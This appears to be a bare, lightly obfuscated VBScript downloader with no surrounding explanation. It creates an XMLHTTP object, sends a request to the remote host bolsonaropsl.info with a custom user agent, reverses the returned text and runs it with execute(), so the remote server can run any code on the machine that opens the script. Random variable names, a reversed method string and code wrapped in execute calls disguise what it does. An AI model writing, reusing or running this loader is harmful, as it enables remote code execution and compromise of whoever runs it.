set ZaRyy=CreateObject("Msxml2.xmlhttp")
kVKAz="fFPf1ckAlPvLFT9jOeSP2HJHl"
ZaRyy.open StrReverse("goway") , "http://bolsonaropsl.info/?join=x5&" & kVKAz ,false
execute("ZaRyy.setRequestHeader ""User-Agent"", ""MyCustomUser"":ZaRyy.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
execute("ZaRyy.send ""join=open"":B=StrReverse(ZaRyy.responseText):execute(B)")
